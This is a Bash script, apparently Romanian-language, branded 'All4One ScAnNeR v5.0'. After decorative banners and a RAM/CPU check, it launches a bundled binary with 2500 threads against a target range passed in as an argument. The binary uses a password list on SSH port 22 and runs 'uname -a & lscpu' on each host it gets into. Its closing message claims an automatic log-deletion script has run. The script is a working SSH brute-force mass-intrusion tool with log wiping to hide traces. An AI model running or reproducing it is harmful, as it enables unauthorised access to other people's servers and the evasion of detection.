#!/bin/bash
# All4One #2019 | © 2018-2019
WHI='[1;37m'
BLK='[1;30m'
RED='[1;31m'
GRN='[0;32m'
YEL='[1;33m'
BLU='[0;34m'
CYN='[1;36m'
RES='[0m'

ram=$(free -m | grep -oP '\d+' | head -n 1)
CPUS=$(grep -c ^processor /proc/cpuinfo)
CPU=$(grep -m 1 "model name" /proc/cpuinfo | cut -d: -f2 | sed -e 's/^ *//' | sed -e 's/$//')
passfile=pass2
threads=2500
port=22
ramminim=3000
cpuminim=1
#
clear
for i in {16..11} {11..16} ; do echo -en "\e[38;5;${i}m©©©©©©©©\e[0m" ; done ; echo
for i in {16..11} {11..16} ; do echo -en "\e[38;5;${i}m©©©©©©©©\e[0m" ; done ; echo
echo "${RES} "                                                                                             
echo "${WHI}                [©]      [©]       [©]     [©]   [©]    [©][©]      [©]      [©]  [©][©][©]"
sleep 0.1                                 
echo "${CYN}             [©][©]     [©]       [©]     [©]   [©]   [©]    [©]   [©][©]   [©]  [©]"    
sleep 0.1                                                                                                                         
echo "${YEL}           [©]  [©]    [©]       [©]     [©]   [©]   [©]     [©]  [©] [©]  [©]  [©][©][©]"  
sleep 0.1                                                                                                                 
echo "${YEL}         [©]    [©]   [©]       [©]     [©][©][©]   [©]     [©]  [©]  [©] [©]  [©]"      
sleep 0.1                                                                                                          
echo "${CYN}       [©][©][©][©]  [©]       [©]           [©]    [©]    [©]  [©]   [©][©]  [©]"     
sleep 0.1                                                                                                    
echo "${WHI}      [©]       [©] [©][©][©] [©][©][©]     [©]       [©][©]   [©]      [©]  [©][©][©]" 
sleep 0.5
echo "${RES} "
for i in {16..11} {11..16} ; do echo -en "\e[38;5;${i}m©©©©©©©©\e[0m" ; done ; echo
for i in {16..11} {11..16} ; do echo -en "\e[38;5;${i}m©©©©©©©©\e[0m" ; done ; echo
sleep 1
echo "${RES} "
echo "${CYN}           --------------------------------------------------------------------------${WHI}" 
echo "${WHI}           |${RED}       by RoberT            ScAnNeR v5.0 - 2019           by CoLa       |${WHI}"          
echo "${CYN}           --------------------------------------------------------------------------${WHI}" 
sleep 1
echo "${CYN}           --------------------------------------------------------------------------${WHI}"
echo "${WHI}           |                 Incep verificarea resurselor: RAM / CPU                |${WHI}"
echo "${CYN}           --------------------------------------------------------------------------${WHI}"
sleep 1
echo "${CYN}           --------------------------------------------------------------------------${WHI}"
if [ $ram -gt $ramminim   ]
    then
        echo " ${WHI}          |          RAM         |       ${ram}MB   [1024MB = 1GB]      -      ${YEL}OK    ${WHI}|"
    else
        echo " ${WHI}          |          RAM         |       ${ram}MB   [1024MB = 1GB]      -      ${RED}NOK   ${WHI}|"
fi         
echo "${CYN}           --------------------------------------------------------------------------${WHI}"
sleep 1
echo "${CYN}           --------------------------------------------------------------------------${WHI}" 
if [ $ram -gt $cpuminim   ]
    then
        echo " ${WHI}          | CPU: ${CPU} | CPUs:  | ${CPUS} |    - ${YEL} OK    ${WHI}|"
    else
        echo " ${WHI}          | CPU: ${CPU} | CPUs:  | ${CPUS} |    - ${RED} NOK   ${WHI}|"
fi
echo "${CYN}           --------------------------------------------------------------------------${WHI}"
sleep 0.5
echo "${CYN}           --------------------------------------------------------------------------${WHI}"
echo "${WHI}           |           Verificare incheiata!   Rulez scriptul de scan: MD           |${WHI}"  
echo "${CYN}           --------------------------------------------------------------------------${WHI}" 
echo "${CYN}           --------------------------------------------------------------------------${WHI}"
echo "${WHI}           |${RED}    V5.0 Last Version - All4One official ScAnNeR - www.a4o.xyz - 2019   |"
echo "${CYN}           --------------------------------------------------------------------------${WHI}" 
sleep 2 ; clear
./cola $threads -b $1 $passfile $port "uname -a & lscpu"
sleep 10
pkill cola
echo "${CYN}           --------------------------------------------------------------------------${WHI}"
echo "${WHI}           |          Scan incheiat! Script automat de stergere logs rulat!         |${WHI}"  
echo "${CYN}           --------------------------------------------------------------------------${WHI}" 
